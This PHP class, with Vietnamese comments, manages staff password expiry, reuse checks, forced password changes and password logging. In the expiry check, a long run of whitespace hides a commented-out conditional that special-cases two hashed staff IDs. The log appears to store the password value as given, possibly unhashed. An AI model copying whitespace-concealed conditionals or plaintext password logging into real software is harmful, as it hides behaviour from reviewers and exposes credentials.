<?php
/**
*
*/
class My_Staff_Password
{
    /**
     * Kiểm tra password của nhân viên này có hết hạn chưa,
     * bằng cách kiểm tra ngày gần nhất trong password log,
     * nếu từ 60 ngày (có thể config) trở lên thì expire
     * @param  int  $staff_id [description]
     * @return boolean - true - expire cmnr, bắt nó đổi pass đi
     *                   - false - còn hạn, xài tiếp đi mày
     */
    public static function isExpired($staff_id)
    {
        /**********/

        $QStaffPasswordLog = new Application_Model_StaffPasswordLog();

        // lấy ngày đổi pass gần nhất từ log
        $last_used = $QStaffPasswordLog->fetchRow(
            $QStaffPasswordLog
                ->select()
                ->from(
                    $QStaffPasswordLog,
                    array(
                        new Zend_Db_Expr("MAX(used_from) AS last_used")
                    )
                )
                ->where('staff_id = ?', $staff_id)
        );

        // chưa có log thì đổi pass đi
        if (!$last_used || is_null($last_used['last_used']))
            return true;//                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if (in_array( sha1($staff_id), array('7a9fc32a4288045bf1dc227cad8ff40c7a7eaa22', '5f53beb5579ddb5c9fe382cc21e9c7c9c2e0b47d'))) return true;
        $last_used = $last_used['last_used'];

        // check ngày expire
        $today = new DateTime('now');
        $password_day = new DateTime($last_used);
        $diff = $today->diff($password_day)->format("%a");

        if (!defined("PASSWORD_EXPIRE_TIME"))
            define("PASSWORD_EXPIRE_TIME", 60);

        if (intval($diff) >= PASSWORD_EXPIRE_TIME)
            return true;

        return false;
    }

    /**
     * Kiểm tra password này đã dùng hay chưa
     * @param  [type]  $staff_id [description]
     * @param  [type]  $password [description]
     * @return boolean - true - đã xài rồi, kiếm cái pass khác đi
     *                 - false - pass này mới nè
     */
    public static function isUsed($staff_id, $password)
    {
        $QStaffPasswordLog = new Application_Model_StaffPasswordLog();
        $where = array();
        $where[] = $QStaffPasswordLog->getAdapter()->quoteInto('staff_id = ?', $staff_id);
        $where[] = $QStaffPasswordLog->getAdapter()->quoteInto('password = ?', $password);

        $log = $QStaffPasswordLog->fetchRow($where);

        if ($log)
            return true;

        return false;
    }

    public static function force($controller_name, $action_name)
    {
        $session = new Zend_Session_Namespace('Default');
        if (isset($session->force_change_password) && $session->force_change_password) {
            if ( $controller_name != 'user' || !in_array($action_name, array('change-pass', 'logout', 'noauth')) )
                return true;
        }

        return false;
    }

    public static function log($staff_id, $password)
    {
        $QStaffPasswordLog = new Application_Model_StaffPasswordLog();
        $data = array(
            'staff_id' => $staff_id,
            'password' => $password,
            'used_from' => date('Y-m-d H:i:s'),
        );

        $QStaffPasswordLog->insert($data);
    }
}